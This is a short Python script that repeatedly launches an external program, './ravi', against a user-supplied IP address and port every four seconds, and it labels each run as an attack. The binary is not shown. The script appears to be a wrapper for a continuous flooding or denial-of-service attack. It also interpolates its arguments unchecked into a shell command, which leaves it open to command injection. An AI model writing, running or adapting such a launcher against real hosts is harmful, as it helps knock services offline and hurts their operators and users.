#!/usr/bin/python3
import time
import subprocess
import sys

if len(sys.argv) != 3:
    print("Usage: python3 test.py <IP> <PORT>")
    sys.exit(1)

target_ip = sys.argv[1]
target_port = sys.argv[2]

print(f"Started continuous attack on {target_ip}:{target_port} (every 4s, attack runs 5s)")

try:
    while True:
        print(f"Launching attack: {target_ip}:{target_port} for 5s")
        subprocess.Popen(f"./ravi {target_ip} {target_port} 5 500", shell=True)
        time.sleep(4)  # Wait 4 sec before launching next one
except KeyboardInterrupt:
    print("\nStopped manually. Exiting...")
    sys.exit(0)